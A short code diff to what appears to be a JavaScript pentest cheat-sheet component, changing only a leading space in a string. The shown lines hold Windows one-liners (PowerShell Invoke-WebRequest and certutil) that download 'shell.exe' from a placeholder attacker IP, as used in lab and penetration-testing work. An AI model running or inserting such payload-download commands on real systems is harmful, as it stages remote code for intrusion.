@@ -20,7 +20,7 @@ export default (props) => {
 	];
 
 	// windows wget like
-	const powershell_http_dl = ' Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe" ';
+	const powershell_http_dl = 'Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe" ';
 	const cmd_cert_http_dl = 'certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe';
 
 	// domain enum
